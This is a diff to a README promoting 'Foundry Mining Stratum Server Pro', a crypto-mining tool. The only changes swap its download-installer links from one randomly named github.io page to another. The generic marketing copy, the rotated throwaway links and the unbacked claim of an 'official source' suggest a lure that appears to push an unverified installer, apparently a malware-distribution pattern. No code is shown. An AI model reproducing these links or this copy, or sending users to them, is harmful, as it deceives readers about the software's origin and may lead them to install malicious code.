@@ -2,7 +2,7 @@
 
 Foundry Mining Stratum Server Pro is a cutting-edge tool designed to enhance your mining efficiency by providing robust stratum server support and customizable settings. This software helps miners optimize their hashrate, manage connections seamlessly, and achieve maximum performance across various setups. Whether you're a beginner or an expert, Foundry Mining Stratum Server Pro offers a user-friendly interface to streamline your mining operations.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -47,6 +47,6 @@ A: Updates are available through the official website. Simply download the lates
 
 To get started with Foundry Mining Stratum Server Pro, download the installer from the official source. This ensures you receive the most secure and up-to-date version of the software.
 
-[Get Foundry Mining Stratum Server Pro](https://yellowtaxisave.github.io/download-page/)
+[Get Foundry Mining Stratum Server Pro](https://capitals-707-bringing.github.io/download-page/)
 
 Thank you for choosing Foundry Mining Stratum Server Pro to enhance your mining experience. For further assistance, visit our documentation or community forums.
